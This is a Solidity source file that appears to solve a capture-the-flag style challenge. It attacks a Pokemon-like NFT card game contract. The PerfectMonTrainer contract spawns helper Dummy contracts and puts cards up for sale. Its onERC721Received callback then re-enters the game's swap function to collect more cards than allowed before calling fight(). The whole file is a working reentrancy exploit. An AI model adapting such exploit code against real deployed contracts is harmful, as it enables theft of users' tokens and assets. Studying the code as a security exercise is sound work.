// SPDX-License-Identifier: NONE
pragma solidity 0.8.12;

import "./Game.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract PerfectMonTrainer {
    Game public game;
    Dummy dumbo1;
    Dummy dumbo2;
    uint[3] public masterDeck;


    constructor(address _game) {
        game = Game(_game);
        masterDeck = game.join();
    }

    function attack() public {
        game.putUpForSale(masterDeck[0]);
        game.putUpForSale(masterDeck[1]);
        game.putUpForSale(masterDeck[2]);
        dumbo1 = new Dummy(address(game));
        dumbo2 = new Dummy(address(game));
        dumbo1.joinGame();
        dumbo2.joinGame();
        dumbo1.putUpForSale();
        dumbo2.putUpForSale();
        dumbo1.giveAway(0, 8);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns(bytes4) {
        uint balance = game.balanceOf(address(this));
        if (balance == 4) {
            dumbo1.giveAway(1, 6);
        } else if (balance == 5) {
            dumbo1.giveAway(2, 7);
        } else if (balance == 6) {
            dumbo2.giveAway(0, 9);
        } else {
            game.fight();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract Dummy {
    address public PMT;
    Game public game;
    uint[3] public deck;

    constructor(address game_) {
        PMT = msg.sender;
        game = Game(game_);
    }

    function joinGame() public {
        deck = game.join();
    }

    function putUpForSale() public {
        game.putUpForSale(deck[0]);
        game.putUpForSale(deck[1]);
        game.putUpForSale(deck[2]);
    }

    function giveAway(uint giveMonId, uint takeMonId) public {
        game.swap(PMT, deck[giveMonId], takeMonId);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns(bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}